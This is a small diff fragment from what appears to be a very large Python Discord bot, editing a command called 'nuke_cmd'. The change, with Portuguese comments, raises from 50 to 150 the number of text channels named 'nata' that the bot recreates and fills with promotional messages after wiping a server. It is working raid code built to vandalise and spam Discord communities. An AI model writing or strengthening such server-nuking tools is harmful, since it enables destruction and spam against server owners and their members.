@@ -42503,9 +42503,9 @@ async def nuke_cmd(ctx: commands.Context):
         except Exception:
             pass
 
-    # 5. Recriar 50 canais "nata" com divulgação
+    # 5. Recriar 150 canais "nata" com divulgação
     _first_ch = None
-    for _ in range(50):
+    for _ in range(150):
         try:
             _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
             await _new_ch.send(
